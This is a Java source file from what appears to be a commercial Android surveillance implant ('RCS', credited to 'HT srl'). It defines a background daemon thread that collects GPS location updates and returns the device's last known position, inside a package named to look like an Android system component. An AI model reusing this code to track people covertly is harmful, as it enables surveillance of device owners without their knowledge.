/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : GPSLocator.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module.position;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Looper;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;

public abstract class GPSLocator extends Thread {
	private static final String TAG = "GPSLocator"; //$NON-NLS-1$
	protected LocationManager lm;
	protected LocationListener listener;

	protected String provider = LocationManager.GPS_PROVIDER;
	private Looper myLooper;

	public GPSLocator() {
		setDaemon(true);
		if (Cfg.DEBUG) {
			setName(getClass().getSimpleName());
		}
		lm = (LocationManager) Status.getAppContext().getSystemService(Context.LOCATION_SERVICE);
	}

	public abstract void initLocationUpdates();

	@Override
	public void run() {
		Looper.prepare();
		initLocationUpdates();

		myLooper = Looper.myLooper();
		Looper.loop();
	}

	public GPSLocator(LocationListener listener) {
		setListener(listener);
	}

	protected void setListener(LocationListener listener) {
		this.listener = listener;
	}

	public Location getLastKnownPosition() {
		return lm.getLastKnownLocation(provider);
	}

	public void halt() {
		if (listener != null && lm != null) {
			lm.removeUpdates(listener);
		}
		
		lm = null;

		if (myLooper != null) {
			myLooper.quit();
		}
	}
}